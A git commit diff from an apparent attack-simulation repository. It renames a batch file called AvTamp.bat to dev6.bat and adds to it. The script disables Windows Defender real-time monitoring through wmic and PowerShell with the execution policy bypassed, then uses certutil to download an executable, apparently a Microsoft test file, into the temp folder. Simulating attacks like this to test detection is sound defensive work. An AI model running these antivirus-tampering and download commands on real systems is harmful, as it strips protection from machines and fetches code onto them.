ee1de2fc6dff99ff155ac5bf6f5f688649b787e4
Kijo Ninja <120234772+LearningKijo@users.noreply.github.com>
2024-03-26 17:20:26 +0900

    Update and rename AvTamp.bat to dev6.bat

--- DEV/SimulationRepo/dev6.bat
+++ DEV/SimulationRepo/dev6.bat
@@ -1,1 +1,3 @@
 wmic process call create "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"Set-MpPreference -DisableRealtimeMonitoring 1\""
+timeout /t 10 /nobreak >nul
+certutil.exe -urlcache -f "https://aka.ms/ioavtest" "%Temp%\validatecloud.exe"
